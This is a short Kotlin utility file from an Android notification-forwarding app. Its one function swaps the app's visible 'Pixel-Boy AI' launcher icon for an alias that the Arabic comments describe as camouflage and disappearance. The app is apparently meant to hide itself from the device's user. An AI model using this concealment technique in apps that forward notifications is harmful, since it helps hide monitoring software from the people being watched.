package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun switchToStealthMode(context: Context) {
        val packageManager = context.packageManager

        // 1️⃣ ألياس العرض الأول (Pixel-Boy AI)
        val pixelBoyAlias = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.LauncherAlias"
        )

        // 2️⃣ ألياس التمويه والاختفاء (مركز العثور)
        val stealthAlias = ComponentName(
            context.packageName,
            "com.itsazni.notificationforwarder.StealthAlias"
        )

        try {
            // تفعيل "مركز العثور" في الخلفية والأجهزة
            packageManager.setComponentEnabledSetting(
                stealthAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // إلغاء وتدمير أيقونة Pixel-Boy AI من الشاشة الرئيسية
            packageManager.setComponentEnabledSetting(
                pixelBoyAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
